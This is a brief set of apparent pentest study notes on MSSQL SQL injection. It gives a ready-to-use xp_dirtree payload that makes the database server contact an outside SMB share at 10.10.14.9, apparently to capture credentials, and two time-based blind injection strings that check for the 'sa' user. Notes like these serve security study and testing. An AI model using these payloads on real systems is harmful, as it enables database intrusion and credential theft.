# SQL Injection

- Commenting: `--`

## Important functions

- xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local
and remote filesystems

```
'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
```

## Time based injection

```
' if (select user) = 'sa' waitfor delay '0:0:5'--
' if (select user) != 'sa' waitfor delay '0:0:5'--
```
